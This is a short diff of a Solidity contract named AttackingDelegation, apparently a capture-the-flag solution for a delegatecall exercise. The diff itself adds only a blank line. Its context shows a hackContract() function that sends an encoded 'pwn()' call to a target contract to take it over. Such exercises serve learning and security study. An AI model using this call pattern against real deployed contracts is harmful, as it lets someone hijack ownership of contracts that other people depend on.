@@ -10,6 +10,7 @@ contract AttackingDelegation {
         contractAddress = _contractAddress;
     }
 
+
     function hackContract() external {
         contractAddress.call(abi.encodeWithSignature("pwn()"));
     }
